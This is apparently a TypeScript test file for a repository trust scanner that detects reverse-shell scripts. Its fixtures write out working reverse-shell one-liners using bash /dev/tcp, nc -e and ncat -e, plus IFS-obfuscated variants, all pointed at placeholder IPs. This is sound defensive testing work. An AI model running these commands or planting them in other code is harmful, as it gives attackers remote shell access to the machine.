import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { buildTrustLintTreeV1 } from "../../../src/detectors/trust-lint/inventory.js";
import { scanNativeMaliciousCodeV1 } from "../../../src/detectors/trust-lint/malicious-code.js";

/**
 * Parity port of the native malicious-code cases in Core's
 * `tests/trust/scan.test.ts` (~lines 4915-5107) against
 * `scanNativeMaliciousCodeV1(buildTrustLintTreeV1(dir))`. Core drove them
 * through `scanTrustTree`; the malicious-code checks are produced unchanged
 * by this module, and the only dropped assertion is the Core plan-level
 * "trust runtime advisory" digest (runtime plan wiring, not detection).
 */
let dir: string;

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "aih-trust-native-"));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

function write(rel: string, content: string): void {
  const path = join(dir, rel);
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, content, "utf8");
}

function scan() {
  return scanNativeMaliciousCodeV1(buildTrustLintTreeV1(dir));
}

describe("scanNativeMaliciousCodeV1 (parity: Core scanTrustTree native checks)", () => {
  it("flags native reverse-shell script shapes as malicious code", () => {
    write("scripts/pwn.sh", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
    write("scripts/nc.sh", "nc -e /bin/sh 203.0.113.10 4444\n");

    const checks = scan();

    expect(checks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          verdict: "fail",
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "scripts/pwn.sh", startLine: 1 }),
          fingerprint: expect.stringMatching(
            /^trust-malicious-code:scripts\/pwn\.sh:[0-9a-f]{64}$/,
          ),
        }),
        expect.objectContaining({
          verdict: "fail",
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "scripts/nc.sh", startLine: 1 }),
        }),
      ]),
    );
  });

  it("keeps native malicious-code identity stable when only its display line shifts", () => {
    const reverseShell = "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1";
    write("scripts/pwn.sh", `${reverseShell}\n`);
    const first = scan().find((check) => check.code === "trust.malicious-code");

    write("scripts/pwn.sh", `# unrelated comment\n${reverseShell}\n`);
    const shifted = scan().find((check) => check.code === "trust.malicious-code");

    expect(first?.location.startLine).toBe(1);
    expect(shifted?.location.startLine).toBe(2);
    expect(shifted?.fingerprint).toBe(first?.fingerprint);
  });

  it("flags ncat exec reverse shells as malicious code", () => {
    write("scripts/ncat.sh", "ncat -e /bin/sh 10.0.0.1 4444\n");

    const checks = scan();

    expect(checks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          verdict: "fail",
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "scripts/ncat.sh", startLine: 1 }),
        }),
      ]),
    );
  });

  it("flags IFS-obfuscated bash reverse shells as malicious code", () => {
    const ifs = "$" + "{IFS}";
    write("scripts/ifs.sh", `bash${ifs}-i${ifs}>&${ifs}/dev/tcp/10.0.0.1/4444${ifs}0>&1\n`);

    const checks = scan();

    expect(checks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          verdict: "fail",
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "scripts/ifs.sh", startLine: 1 }),
        }),
      ]),
    );
  });

  it("flags IFS substring/pattern-expansion obfuscated reverse shells as malicious code", () => {
    const sub = "$" + "{IFS:0:1}";
    const pat = "$" + "{IFS//?/}";
    write("scripts/sub.sh", `nc${sub}-e${sub}/bin/sh 10.0.0.1 4444\n`);
    write("scripts/pat.sh", `nc${pat}-e${pat}/bin/sh 10.0.0.1 4444\n`);

    const checks = scan();

    expect(checks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          verdict: "fail",
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "scripts/sub.sh", startLine: 1 }),
        }),
        expect.objectContaining({
          verdict: "fail",
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "scripts/pat.sh", startLine: 1 }),
        }),
      ]),
    );
  });

  it("does not hard-deny conventional curl-piped installer scripts", () => {
    write(
      "install.sh",
      ["curl -fsSL https://get.docker.com | sh", "curl https://sh.rustup.rs | sh"].join("\n"),
    );

    const checks = scan();

    expect(checks.some((check) => check.code === "trust.malicious-code")).toBe(false);
  });

  it("does not scan installer-looking non-script assets as script text", () => {
    write("assets/install-notes.png", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
    write("install.sh", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");

    const checks = scan();

    expect(checks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "install.sh" }),
        }),
      ]),
    );
    expect(
      checks.some(
        (check) =>
          check.code === "trust.malicious-code" &&
          check.location.uri === "assets/install-notes.png",
      ),
    ).toBe(false);
  });

  it("scans extensionless setup-named scripts for malicious shapes", () => {
    write("install", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
    write("setup", "nc -e /bin/sh 203.0.113.10 4444\n");

    const checks = scan();

    expect(checks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "install", startLine: 1 }),
        }),
        expect.objectContaining({
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "setup", startLine: 1 }),
        }),
      ]),
    );
  });

  it("scans arbitrary extensionless files for malicious shapes", () => {
    write("payload", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");

    const checks = scan();

    expect(checks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          code: "trust.malicious-code",
          location: expect.objectContaining({ uri: "payload", startLine: 1 }),
        }),
      ]),
    );
  });

  it("skips oversized script files before reading them as UTF-8", () => {
    write(
      "large.sh",
      `${"x".repeat(512 * 1024 + 1)}\nbash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n`,
    );

    const checks = scan();

    expect(checks.some((check) => check.code === "trust.malicious-code")).toBe(false);
  });
});
